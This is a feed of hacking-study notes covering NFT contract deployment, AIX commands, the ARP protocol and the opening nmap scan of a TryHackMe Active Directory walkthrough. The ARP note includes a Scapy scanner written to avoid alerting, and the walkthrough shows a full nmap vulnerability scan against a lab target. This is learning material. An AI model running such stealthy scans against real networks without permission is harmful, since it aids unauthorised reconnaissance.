I already have a standard location for my avatar.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://app.ens.domains/name/necopinus.xyz/details&quot;&gt;necopinus.xyz on ENS&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://app.safe.global/&quot;&gt;Safe&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The first real step was thus to upload a JSON metadata file pointing to this avatar.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode json&quot;&gt;&lt;code class=&quot;sourceCode json&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;&amp;quot;description&amp;quot;&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;The avatar NFT for necopinus.&amp;quot;&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;&amp;quot;external_url&amp;quot;&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;https://necopinus.xyz/&amp;quot;&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;&amp;quot;image&amp;quot;&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;https://necopinus.xyz/avatar/avatar.webp&amp;quot;&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;necopinus&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I put this at &lt;code&gt;https://necopinus.xyz/âavatar/âethereum/â&amp;lt;WALLET_ADDRESS&amp;gt;.json&lt;/code&gt; to make it straight forward to support additional wallets and blockchains in the future.&lt;/p&gt;&lt;p&gt;Once this was done, I decided to more-or-less follow the &quot;How to Develop an NFT Smart Contract (ERC721) with Alchemy&quot; walk-through. I'm going to skip a lot of the details here, so if you're trying to do this yourself you should also read through that document.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://docs.alchemy.com/docs/how-to-develop-an-nft-smart-contract-erc721-with-alchemy&quot;&gt;How to Develop an NFT Smart Contract (ERC721) with Alchemy&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;I also tested deploying the smart contract and minting my NFTs on the Goerli TestNet before committing any money to deploy on the Ethereum MainNet. To do this, you'll need to get some GoerliETH; the easiest way to do this is to create an account on Alchemy and then visit the Goerli &quot;faucet&quot;, which will transfer 0.2 GoerliETH to your wallet (more than enough for what follows.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.alchemy.com&quot;&gt;Alchemy&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://goerlifaucet.com/&quot;&gt;Goerli FAUCET&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Next, go to the Open Zeppelin Contracts Wizard to pre-generate smart contract code. I'm going to select an ERC721 contract and select the &quot;Mintable, Autoincrement IDs&quot;, &quot;Enumerable&quot;, and &quot;URI Storage&quot; options + uncreative contract and token names. This produces the following code.&lt;/p&gt;&lt;pre class=&quot;solidity&quot;&gt;&lt;code&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import &amp;quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&amp;quot;;
import &amp;quot;@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol&amp;quot;;
import &amp;quot;@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol&amp;quot;;
import &amp;quot;@openzeppelin/contracts/access/Ownable.sol&amp;quot;;
import &amp;quot;@openzeppelin/contracts/utils/Counters.sol&amp;quot;;

contract NFTAvatar is ERC721, ERC721Enumerable, ERC721URIStorage, Ownable {
    using Counters for Counters.Counter;

    Counters.Counter private _tokenIdCounter;

    constructor() ERC721(&amp;quot;NFTAvatar&amp;quot;, &amp;quot;NFTAVATAR&amp;quot;) {}

    function safeMint(address to, string memory uri) public onlyOwner {
        uint256 tokenId = _tokenIdCounter.current();
        _tokenIdCounter.increment();
        _safeMint(to, tokenId);
        _setTokenURI(tokenId, uri);
    }

    // The following functions are overrides required by Solidity.

    function _beforeTokenTransfer(address from, address to, uint256 tokenId, uint256 batchSize)
        internal
        override(ERC721, ERC721Enumerable)
    {
        super._beforeTokenTransfer(from, to, tokenId, batchSize);
    }

    function _burn(uint256 tokenId) internal override(ERC721, ERC721URIStorage) {
        super._burn(tokenId);
    }

    function tokenURI(uint256 tokenId)
        public
        view
        override(ERC721, ERC721URIStorage)
        returns (string memory)
    {
        return super.tokenURI(tokenId);
    }

    function supportsInterface(bytes4 interfaceId)
        public
        view
        override(ERC721, ERC721Enumerable)
        returns (bool)
    {
        return super.supportsInterface(interfaceId);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://docs.openzeppelin.com/contracts/4.x/wizard&quot;&gt;Open Zeppelin Contracts Wizard&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Since I'm &lt;em&gt;not&lt;/em&gt; producing NFTs for public consumption, I skipped the parts of the Alchemy walk-through where this code was modified to cap the number of NFTs and make it possible for addresses other than the contract's owner to call it.&lt;/p&gt;&lt;p&gt;Up until now, Safari, Light Wallet, and the iPad Pro work swimmingly. Unfortunately, the web-based Ethereum Remix IDE, which is how we'll deploy the smart contract code above, does &lt;em&gt;not&lt;/em&gt; play well with this setup. The issue might be Safari, or it might be Light Wallet; I'm not sure, but the behavior of Remix on both iPadOS and macOS is identical: You can compile the smart contract code (though lockdown mode must be disabled for the site), but attempting to deploy the code always results in a mysterious &quot;Transaction Failed&quot; error message.&lt;/p&gt;&lt;p&gt;Eventually I installed Brave on my MacBook for the sole purpose of being able to deploy the smart contract code. Brave's built-in wallet works perfectly with Remix.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://brave.com/&quot;&gt;Brave Browser&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://brave.com/wallet/&quot;&gt;Brave Wallet&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;You'll want to note down the version of Solidity you used to compile the smart contract, the wallet address you used to deploy it, and the smart contract's address on the blockchain. With this information, you can always return to remix, recompile the smart contract code, connect the controlling wallet, and then reconnect to the smart contract to mint additional NFTs.&lt;/p&gt;&lt;p&gt;Once the contract was deployed, the only other stumbling block I ran into was that it's not obvious that the &lt;code&gt;safeMint&lt;/code&gt; function requires &lt;em&gt;two&lt;/em&gt; arguments - the first is the address to send the NFT to, and the second is the metadata URI. You can use the chevron next to the function name in Remix to expand both arguments into separate fields, which makes it more obvious how to enter in the necessary information.&lt;/p&gt;&lt;p&gt;The &lt;code&gt;tokenURI&lt;/code&gt; function is also useful: When called with the token ID (an incrementing integer, starting at 0), it will return the metadata URI for the corresponding NFT.&lt;/p&gt;&lt;p&gt;The minted NFTs took a looooong time to show up in MetaMask, but they did show up in OpenSea pretty much immediately. You can use the OpenSea interface to transfer the minted NFTs to other accounts.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://metamask.io&quot;&gt;MetaMask&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://opensea.io&quot;&gt;OpenSea&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://testnets.opensea.io&quot;&gt;OpenSea Testnets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;It's worth noting here that viewing and transferring any NFTs you mint works fine on Safari + Light Wallet. It's &lt;em&gt;only&lt;/em&gt; the Remix IDE that doesn't like that setup, and in fact it's &lt;em&gt;only&lt;/em&gt; deploying and interacting with your contract that's broken. Everything else in this process can be done using iPadOS. Hopefully this situation will improve over time.&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Some%20Remarks/2022-11-27%20Trying%20%28and%20Failing%29%20to%20Deploy%20a%20Smart%20Contract%20Using%20an%20iPad%20Pro.md</guid>
		</item>
		<item>
			<title>AIX</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/AIX.md</link>
			<description>&lt;h2 id=&quot;system-information&quot;&gt;System Information&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;oslevel&lt;/span&gt;     # Report system version&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;oslevel&lt;/span&gt; -rq # Report &lt;span class=&quot;st&quot;&gt;&amp;quot;technology level&amp;quot;&lt;/span&gt; (major release?)&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;co&quot;&gt;# information&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;oslevel&lt;/span&gt; -sq # Report service pack information&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Different system components (&quot;filesets&quot;) can be at different technology levels / service packs. You can list which software that is more (&lt;code&gt;-g&lt;/code&gt;) or less (&lt;code&gt;-l&lt;/code&gt;) recent than a given technology level (&lt;code&gt;-r&lt;/code&gt;) or service pack (&lt;code&gt;-s&lt;/code&gt;); for example:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;oslevel&lt;/span&gt; -s -l &lt;span class=&quot;va&quot;&gt;$SERVICE_PACK&lt;/span&gt; # List filesets below the specified&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                            &lt;span class=&quot;co&quot;&gt;# service pack&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.ibm.com/docs/en/aix/7.2?topic=o-oslevel-command&quot;&gt;oslevel Command&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;fileset-information&quot;&gt;Fileset Information&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;lslpp&lt;/span&gt; -l               # List all filesets&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;lslpp&lt;/span&gt; -h &lt;span class=&quot;va&quot;&gt;$FILESET_NAME&lt;/span&gt; # Detailed fileset information&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Some versions of AIX can also apparently use the RPM package manager.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.ibm.com/docs/en/aix/7.2?topic=l-lslpp-command&quot;&gt;lslpp Command&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./How%20to%20Match%20Files%20to%20Packages.md&quot;&gt;How to Match Files to Packages&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/AIX.md</guid>
		</item>
		<item>
			<title>ARP Protocol</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/ARP%20Protocol.md</link>
			<description>&lt;p&gt;The ARP protocol links OSI layers 2 and 3 by mapping IP addresses to MAC addresses. ARP packet message headers contain two operation codes: REQUEST (1) and REPLY (2).&lt;/p&gt;&lt;p&gt;Basically, an ARP request will broadcast &quot;to&quot; a particular IP address but using the &quot;broadcast&quot; MAC address (00:00:00:00:00:00), and the computer with that IP address will then reply in a non-broadcast fashion (since this requires that both the MAC address and IP address be filled in, such a direct reply provides the desired information by way of its very existence).&lt;/p&gt;&lt;p&gt;Because ARP requests are about binding a MAC address to an IP address, they are necessarily limited to the current subnet.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./OSI%20Model.md&quot;&gt;OSI Model&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;arp-cache&quot;&gt;ARP Cache&lt;/h2&gt;&lt;p&gt;Examine the ARP cache on Windows:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;arp -a&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;arp-scanning&quot;&gt;ARP Scanning&lt;/h2&gt;&lt;p&gt;Scanning a network with ARP rather than ICMP is one method of keeping a lower profile, as ARP requests are less likely to be monitored.&lt;/p&gt;&lt;p&gt;It's fairly easy to set up such a scanner using the Scapy module:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#!/usr/bin/env python3&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Scans the given IP range on the given network using ARP&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# rather than ICMP to help bypass potential alerting.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;im&quot;&gt;from&lt;/span&gt; scapy.&lt;span class=&quot;bu&quot;&gt;all&lt;/span&gt; &lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;*&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;interface &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;eth0&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-9&quot;&gt;&lt;a href=&quot;#cb2-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;ip_range &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;10.10.X.X/24&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-10&quot;&gt;&lt;a href=&quot;#cb2-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;broadcastMac &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;ff:ff:ff:ff:ff:ff&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-11&quot;&gt;&lt;a href=&quot;#cb2-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-12&quot;&gt;&lt;a href=&quot;#cb2-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;packet &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; Ether(dst &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; broadcastMac) &lt;span class=&quot;op&quot;&gt;/&lt;/span&gt; ARP(pdst &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; ip_range)&lt;/span&gt;
&lt;span id=&quot;cb2-13&quot;&gt;&lt;a href=&quot;#cb2-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-14&quot;&gt;&lt;a href=&quot;#cb2-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;ans, unans &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; srp(packet, timeout &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;2&lt;/span&gt;, iface &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; interface, inter &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;fl&quot;&gt;0.1&lt;/span&gt;)&lt;/span&gt;
&lt;span id=&quot;cb2-15&quot;&gt;&lt;a href=&quot;#cb2-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-16&quot;&gt;&lt;a href=&quot;#cb2-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;cf&quot;&gt;for&lt;/span&gt; send, receive &lt;span class=&quot;kw&quot;&gt;in&lt;/span&gt; ans:&lt;/span&gt;
&lt;span id=&quot;cb2-17&quot;&gt;&lt;a href=&quot;#cb2-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt;(receive.sprintf(&lt;span class=&quot;vs&quot;&gt;r&amp;quot;&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;%E&lt;/span&gt;&lt;span class=&quot;vs&quot;&gt;ther.src% - %ARP.psrc%&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that the &lt;code&gt;r&lt;/code&gt; here isn't a mistake â rather it specifies a &quot;raw string&quot; (the use of which, incidentally, requires Python 3.6+).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/pythonforcybersecurity&quot;&gt;TryHackMe: Python for Pentesters&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://scapy.net/&quot;&gt;Scapy&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://whatisanything.com/how-do-you-write-an-f-string-in-python/#What_does_R_mean_Python&quot;&gt;Quick Answer: How Do You Write An F String In Python&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/ARP%20Protocol.md</guid>
		</item>
		<item>
			<title>Attacktive Directory</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Attacktive%20Directory.md</link>
			<description>&lt;h2 id=&quot;welcome-to-attacktive-directory&quot;&gt;Welcome to Attacktive Directory&lt;/h2&gt;&lt;p&gt;As usual, we start off with an nmap scan. Our target IP address is 10.10.177.198.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oA attacktive-directory -Pn -A -T4 -sS &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;ex&quot;&gt;-script&lt;/span&gt; vuln -p- 10.10.177.198&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This gives us the following results.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Thu Dec 30 20:16:35 2021 as: nmap -v -oA attacktive-directory -Pn -A -T4 -sS -script vuln -p- 10.10.177.198
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Increasing send delay for 10.10.177.198 from 0 to 5 due to 2065 out of 5162 dropped probes since last increase.
Increasing send delay for 10.10.177.198 from 5 to 10 due to 11 out of 14 dropped probes since last increase.
Nmap scan report for 10.10.177.198
Host is up (0.18s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-31 03:31:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49823/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/30%OT=53%CT=1%CU=35966%PV=Y%DS=4%DC=T%G=Y%TM=61CE7D
OS:75%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS
OS:=U)OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NN
OS:S%O6=M506NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y
OS:%DF=Y%T=80%W=FFFF%O=M506NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD
OS:=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD
OS:=Z)

Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   34.37 ms  10.13.0.1
2   ... 3
4   183.65 ms 10.10.177.198

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 20:48:05 2021 -- 1 IP address (1 host up) scanned in 1890.41 seconds
